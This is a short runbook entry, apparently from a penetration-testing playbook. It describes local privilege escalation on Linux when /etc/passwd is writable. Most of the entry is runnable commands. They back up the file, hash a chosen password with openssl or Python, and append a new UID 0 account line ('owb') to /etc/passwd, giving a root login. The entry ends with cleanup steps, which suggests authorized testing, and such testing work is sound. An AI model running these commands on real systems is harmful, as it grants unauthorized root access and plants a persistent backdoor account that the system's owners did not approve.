# LPRIV-19. Writable `/etc/passwd`

**Run this when:** `/etc/passwd` is writable by the current user.

Writable check, hash tool, backup:

```bash
ls -l /etc/passwd
command -v openssl || command -v python3
cp --preserve=all -- /etc/passwd /tmp/owb-passwd.bak
sha256sum -- /etc/passwd /tmp/owb-passwd.bak
```

**Look for:** owner write on the file. The account is added to `/etc/passwd` only;
`/etc/shadow` is not touched, so the hash lives in the second field.

**If found:** generate a hash and append one line:

Hash for the new account:

```bash
openssl passwd -6 '<PASSWORD>'
# or, when only Python exists: python3 -c 'import crypt; print(crypt.crypt("<PASSWORD>", crypt.mksalt(crypt.METHOD_SHA512)))'
printf 'owb:<HASH>:0:0:root:/root:/bin/bash\n' >> /etc/passwd
getent passwd owb
```

`su owb` prompts for the password you hashed; it is not passwordless. Verify the
new identity with `id`.

Remove the appended line afterwards, or restore the copy when the file must stay
byte-exact. A duplicate UID 0 account is a real login, not a modified user.
